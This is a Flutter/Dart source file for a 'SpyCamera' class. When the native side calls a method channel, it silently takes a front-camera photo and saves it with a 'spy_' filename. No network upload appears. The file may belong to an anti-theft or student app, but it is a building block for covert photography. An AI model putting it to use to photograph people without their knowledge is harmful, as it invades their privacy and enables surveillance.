import 'dart:io';
import 'package:flutter/services.dart';
import 'package:camera/camera.dart';
import 'package:flutter/foundation.dart';
import 'package:path_provider/path_provider.dart';

class SpyCamera {
  static const MethodChannel _channel = MethodChannel('com.ti24a3.app7/spy');
  static CameraController? _controller;
  static bool _isInitializing = false;

  static void init() {
    _channel.setMethodCallHandler(_handleMethodCall);
  }

  static Future<dynamic> _handleMethodCall(MethodCall call) async {
    if (call.method == 'takePhoto') {
      final path = await takePhoto();
      if (path != null) {
        _channel.invokeMethod('photoResult', path);
      } else {
        _channel.invokeMethod('photoResult', null);
      }
      return path;
    }
    return null;
  }

  static Future<String?> takePhoto() async {
    if (_isInitializing) {
      return null;
    }

    try {
      _isInitializing = true;

      if (_controller == null || !_controller!.value.isInitialized) {
        final cameras = await availableCameras();
        final frontCamera = cameras.firstWhere(
          (c) => c.lensDirection == CameraLensDirection.front,
          orElse: () => cameras.first,
        );

        _controller = CameraController(
          frontCamera,
          ResolutionPreset.medium,
          enableAudio: false,
        );
        await _controller!.initialize();
      }

      if (_controller!.value.isInitialized) {
        final image = await _controller!.takePicture();
        final originalPath = image.path;

        // Copy ke documents directory biar gak kehapus
        final dir = await getApplicationDocumentsDirectory();
        final newPath = '${dir.path}/spy_${DateTime.now().millisecondsSinceEpoch}.jpg';
        final file = File(originalPath);
        await file.copy(newPath);

        debugPrint('📸 SpyCamera: Photo saved to $newPath');
        return newPath;
      }

      return null;
    } catch (e) {
      debugPrint('❌ SpyCamera error: $e');
      return null;
    } finally {
      _isInitializing = false;
    }
  }

  static void dispose() {
    _controller?.dispose();
    _controller = null;
  }
}
